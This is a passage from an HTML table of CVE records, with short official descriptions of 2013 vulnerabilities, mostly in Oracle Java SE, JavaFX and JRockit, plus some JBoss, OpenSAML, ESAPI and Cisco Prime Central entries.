		<td valign="top">JBoss Overlord Run Time Governance (RTGov) 1.0 for JBossAS allows remote authenticated users to execute arbitrary Java code via an MVFLEX Expression Language (MVEL) expression. NOTE: some of these details are obtained from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-6468">CVE-2013-6468</a></td>
		<td valign="top">JBoss Drools, Red Hat JBoss BRMS before 6.0.1, and Red Hat JBoss BPM Suite before 6.0.1 allows remote authenticated users to execute arbitrary Java code via a (1) MVFLEX Expression Language (MVEL) or (2) Drools expression.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-6440">CVE-2013-6440</a></td>
		<td valign="top">The (1) BasicParserPool, (2) StaticBasicParserPool, (3) XML Decrypter, and (4) SAML Decrypter in Shibboleth OpenSAML-Java before 2.6.1 set the expandEntityReferences property to true, which allows remote attackers to conduct XML external entity (XXE) attacks via a crafted XML DOCTYPE declaration.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-6366">CVE-2013-6366</a></td>
		<td valign="top">The Groovy script console in VMware Hyperic HQ 4.6.6 allows remote authenticated administrators to execute arbitrary code via a Runtime.getRuntime().exec call.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-6235">CVE-2013-6235</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in JAMon (Java Application Monitor) 2.7 and earlier allow remote attackers to inject arbitrary web script or HTML via the (1) listenertype or (2) currentlistener parameter to mondetail.jsp or ArraySQL parameter to (3) mondetail.jsp, (4) jamonadmin.jsp, (5) sql.jsp, or (6) exceptions.jsp.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5960">CVE-2013-5960</a></td>
		<td valign="top">The authenticated-encryption feature in the symmetric-encryption implementation in the OWASP Enterprise Security API (ESAPI) for Java 2.x before 2.1.0.1 does not properly resist tampering with serialized ciphertext, which makes it easier for remote attackers to bypass intended cryptographic protection mechanisms via an attack against the intended cipher mode in a non-default configuration, a different vulnerability than CVE-2013-5679.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5910">CVE-2013-5910</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45, Java SE Embedded 7u45, and OpenJDK 7 allows remote attackers to affect integrity via unknown vectors related to Security.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that CanonicalizerBase.java in the XML canonicalizer allows untrusted code to access mutable byte arrays.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5907">CVE-2013-5907</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45; JRockit R27.7.7 and R28.2.9; Java SE Embedded 7u45; and OpenJDK 7 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that the issue is due to incorrect input validation in LookupProcessor.cpp in the ICU Layout Engine, which allows attackers to cause a denial of service (crash) or possibly execute arbitrary code via a crafted font file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5906">CVE-2013-5906</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Install, a different vulnerability than CVE-2013-5905.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5905">CVE-2013-5905</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Install, a different vulnerability than CVE-2013-5906.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5904">CVE-2013-5904</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5902">CVE-2013-5902</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5889, CVE-2014-0410, CVE-2014-0415, CVE-2014-0418, and CVE-2014-0424.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5899">CVE-2013-5899</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45 allows remote attackers to affect confidentiality via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5898">CVE-2013-5898</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2014-0375 and CVE-2014-0403.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5896">CVE-2013-5896</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45; Java SE Embedded 7u45; and OpenJDK 7 allows remote attackers to affect availability via vectors related to CORBA.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that com.sun.corba.se and its sub-packages are not included on the restricted package list.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5895">CVE-2013-5895</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u45 and JavaFX 2.2.45 allows remote attackers to affect confidentiality via unknown vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5893">CVE-2013-5893</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u45 and Java SE Embedded 7u45, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that the issue is related to improper handling of methods in MethodHandles in HotSpot JVM, which allows attackers to escape the sandbox.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5889">CVE-2013-5889</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5902, CVE-2014-0410, CVE-2014-0415, CVE-2014-0418, and CVE-2014-0424.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5888">CVE-2013-5888</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45, when running with GNOME, allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5887">CVE-2013-5887</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45 allows remote attackers to affect availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5884">CVE-2013-5884</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 5.0u55, 6u65, and 7u45; Java SE Embedded 7u45; and OpenJDK 7 allows remote attackers to affect confidentiality via vectors related to CORBA.  NOTE: the previous information is from the January 2014 CPU. Oracle has not commented on third-party claims that the issue is related to an incorrect check for code permissions by CORBA stub factories.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5878">CVE-2013-5878</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 6u65 and 7u45, Java SE Embedded 7u45, and OpenJDK 7 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Security.  NOTE: the previous information is from the January 2014 CPU.  Oracle has not commented on third-party claims that the Security component does not properly handle null XML namespace (xmlns) attributes during XML document canonicalization, which allows attackers to escape the sandbox.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5870">CVE-2013-5870</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u45 and JavaFX 2.2.45 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5854">CVE-2013-5854</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier and JavaFX 2.2.40 and earlier allows remote attackers to affect confidentiality via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5852">CVE-2013-5852</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5787, CVE-2013-5789, CVE-2013-5824, and CVE-2013-5832.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5851">CVE-2013-5851</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality via vectors related to JAXP.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5850">CVE-2013-5850</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2013-5842.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5849">CVE-2013-5849</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality via vectors related to AWT.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5848">CVE-2013-5848</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and JavaFX 2.2.40 and earlier allows remote attackers to affect integrity via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5846">CVE-2013-5846</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, and JavaFX 2.2.40 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5844">CVE-2013-5844</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier and JavaFX 2.2.40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to JavaFX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5843">CVE-2013-5843</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, JavaFX 2.2.40 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5842">CVE-2013-5842</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries, a different vulnerability than CVE-2013-5850.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5840">CVE-2013-5840</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5839">CVE-2013-5839</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Solaris 10 allows remote attackers to affect integrity via unknown vectors related to Oracle Java Web Console.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5838">CVE-2013-5838</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u25 and earlier, and Java SE Embedded 7u25 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5832">CVE-2013-5832</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5787, CVE-2013-5789, CVE-2013-5824, and CVE-2013-5852.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5831">CVE-2013-5831</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5818 and CVE-2013-5819.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5830">CVE-2013-5830</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, JRockit R28.2.8 and earlier, JRockit R27.7.6 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5829">CVE-2013-5829</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D, a different vulnerability than CVE-2013-5809.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5825">CVE-2013-5825</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, JRockit R28.2.8 and earlier, JRockit R27.7.6 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect availability via vectors related to JAXP.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5824">CVE-2013-5824</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5787, CVE-2013-5789, CVE-2013-5832, and CVE-2013-5852.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5823">CVE-2013-5823</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, JRockit R28.2.8 and earlier, JRockit R27.7.6 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect availability via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5820">CVE-2013-5820</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect integrity via vectors related to JAX-WS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5819">CVE-2013-5819</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5818 and CVE-2013-5831.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5818">CVE-2013-5818</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5819 and CVE-2013-5831.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5817">CVE-2013-5817</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JNDI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5814">CVE-2013-5814</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via vectors related to CORBA.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5812">CVE-2013-5812</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5810">CVE-2013-5810</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier and JavaFX 2.2.40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5809">CVE-2013-5809</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D, a different vulnerability than CVE-2013-5829.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5806">CVE-2013-5806</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Swing, a different vulnerability than CVE-2013-5805.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5805">CVE-2013-5805</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Swing, a different vulnerability than CVE-2013-5806.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5804">CVE-2013-5804</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, JRockit R28.2.8 and earlier, and JRockit R27.7.6 and earlier allows remote attackers to affect confidentiality and integrity via unknown vectors related to Javadoc.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5803">CVE-2013-5803</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, JRockit R28.2.8 and earlier, JRockit R27.7.6 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect availability via vectors related to JGSS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5802">CVE-2013-5802</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, JRockit R28.2.8 and earlier, JRockit R27.7.6 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via vectors related to JAXP.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5801">CVE-2013-5801</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5800">CVE-2013-5800</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality via vectors related to JGSS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5797">CVE-2013-5797</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, JRockit R28.2.8 and earlier, JRockit R27.7.6 and earlier, and JavaFX 2.2.40 and earlier allows remote authenticated users to affect integrity via unknown vectors related to Javadoc.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5790">CVE-2013-5790</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality via vectors related to BEANS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5789">CVE-2013-5789</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5787, CVE-2013-5824, CVE-2013-5832, and CVE-2013-5852.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5788">CVE-2013-5788</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5787">CVE-2013-5787</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-5789, CVE-2013-5824, CVE-2013-5832, and CVE-2013-5852.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5784">CVE-2013-5784</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect integrity via vectors related to SCRIPTING.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5783">CVE-2013-5783</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality and integrity via unknown vectors related to Swing.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5782">CVE-2013-5782</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, JRockit R28.2.8 and earlier, JRockit R27.7.6 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5780">CVE-2013-5780</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, JRockit R28.2.8 and earlier, JRockit R27.7.6 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5778">CVE-2013-5778</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, 6u60 and earlier, 5.0u51 and earlier, and Embedded 7u40 and earlier allows remote attackers to affect confidentiality via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5777">CVE-2013-5777</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE and JavaFX components in Oracle Java SE 7u40 and earlier and JavaFX 2.2.40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2013-5775.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5776">CVE-2013-5776</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE and Java SE Embedded components in Oracle Java SE Java SE 7u40 and earlier, Java SE 6u60 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect integrity via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5775">CVE-2013-5775</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE and JavaFX components in Oracle Java SE 7u40 and earlier and JavaFX 2.2.40 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than CVE-2013-5777.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5774">CVE-2013-5774</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Java SE 7u40 and earlier, 6u60 and earlier, 5.0u51 and earlier, and Embedded 7u40 and earlier allows remote attackers to affect integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5772">CVE-2013-5772</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE component in Oracle Java SE Java SE 7u40 and earlier and Java SE 6u60 and earlier allows remote attackers to affect integrity via unknown vectors related to jhat.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5679">CVE-2013-5679</a></td>
		<td valign="top">The authenticated-encryption feature in the symmetric-encryption implementation in the OWASP Enterprise Security API (ESAPI) for Java 2.x before 2.1.0 does not properly resist tampering with serialized ciphertext, which makes it easier for remote attackers to bypass intended cryptographic protection mechanisms via an attack against authenticity in the default configuration, involving a null MAC and a zero MAC length.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5564">CVE-2013-5564</a></td>
		<td valign="top">The Java process in the Impact server in Cisco Prime Central for Hosted Collaboration Solution (HCS) allows remote attackers to cause a denial of service (process crash) via a flood of TCP packets, aka Bug ID CSCug57345.

</td>
	</tr>
	<tr>
